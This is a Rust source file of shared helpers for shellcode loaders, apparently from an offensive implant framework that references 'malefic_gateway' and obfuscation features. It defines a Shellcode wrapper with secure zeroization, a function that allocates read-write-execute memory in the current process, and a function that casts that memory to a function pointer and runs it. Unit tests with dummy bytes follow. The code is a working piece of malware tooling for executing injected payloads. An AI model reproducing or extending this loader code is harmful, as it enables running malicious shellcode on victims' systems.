//! Common types and utilities for loaders

use crate::types::*;

/// Shellcode wrapper type
pub struct Shellcode {
    pub data: Vec<u8>,
}

impl Shellcode {
    pub fn new(data: Vec<u8>) -> Self {
        Self { data }
    }

    pub fn from_slice(data: &[u8]) -> Self {
        Self { data: data.to_vec() }
    }

    pub fn len(&self) -> usize {
        self.data.len()
    }

    pub fn is_empty(&self) -> bool {
        self.data.is_empty()
    }

    pub fn as_ptr(&self) -> *const u8 {
        self.data.as_ptr()
    }

    pub fn as_slice(&self) -> &[u8] {
        &self.data
    }

    #[cfg(feature = "obf_memory")]
    pub fn zeroize(&mut self) {
        malefic_gateway::secure::zeroize::secure_zeroize_vec(&mut self.data);
    }
}

#[cfg(feature = "obf_memory")]
impl Drop for Shellcode {
    fn drop(&mut self) {
        self.zeroize();
    }
}

/// Allocate executable memory in current process
pub unsafe fn alloc_exec_memory(size: usize) -> Option<*mut std::ffi::c_void> {
    let addr = crate::binding::MVirtualAlloc(
        std::ptr::null_mut(),
        size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    );
    if addr.is_null() {
        None
    } else {
        Some(addr)
    }
}

/// Execute shellcode via function pointer
pub type ShellcodeFunc = unsafe extern "system" fn();

pub unsafe fn execute_via_func_ptr(addr: *const std::ffi::c_void) {
    let func: ShellcodeFunc = std::mem::transmute(addr);
    func();
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_shellcode_new() {
        let sc = Shellcode::new(vec![0x90, 0xCC, 0xC3]);
        assert_eq!(sc.data, vec![0x90, 0xCC, 0xC3]);
    }

    #[test]
    fn test_shellcode_from_slice() {
        let data: &[u8] = &[0x41, 0x42, 0x43];
        let sc = Shellcode::from_slice(data);
        assert_eq!(sc.data, data);
    }

    #[test]
    fn test_shellcode_len() {
        let sc = Shellcode::new(vec![1, 2, 3, 4, 5]);
        assert_eq!(sc.len(), 5);
    }

    #[test]
    fn test_shellcode_is_empty() {
        assert!(Shellcode::new(vec![]).is_empty());
        assert!(!Shellcode::new(vec![0x90]).is_empty());
    }

    #[test]
    fn test_shellcode_as_ptr_not_null() {
        let sc = Shellcode::new(vec![0xCC]);
        assert!(!sc.as_ptr().is_null());
    }

    #[test]
    fn test_shellcode_as_slice_roundtrip() {
        let data = vec![0xDE, 0xAD, 0xBE, 0xEF];
        let sc = Shellcode::new(data.clone());
        assert_eq!(sc.as_slice(), &data[..]);
    }

    #[test]
    fn test_shellcode_empty_creation() {
        let sc = Shellcode::new(vec![]);
        assert_eq!(sc.len(), 0);
        assert!(sc.is_empty());
        assert_eq!(sc.as_slice(), &[]);
    }

    #[test]
    fn test_shellcode_large_data() {
        let data: Vec<u8> = (0..4096).map(|i| (i & 0xFF) as u8).collect();
        let sc = Shellcode::new(data.clone());
        assert_eq!(sc.len(), 4096);
        assert_eq!(sc.as_slice(), &data[..]);
    }

    #[test]
    fn test_shellcode_from_slice_is_copy() {
        let data: &[u8] = &[1, 2, 3];
        let sc = Shellcode::from_slice(data);
        // Modifying original slice shouldn't affect shellcode (it's a copy)
        assert_eq!(sc.as_slice(), data);
        assert_ne!(sc.as_ptr(), data.as_ptr()); // different allocation
    }
}
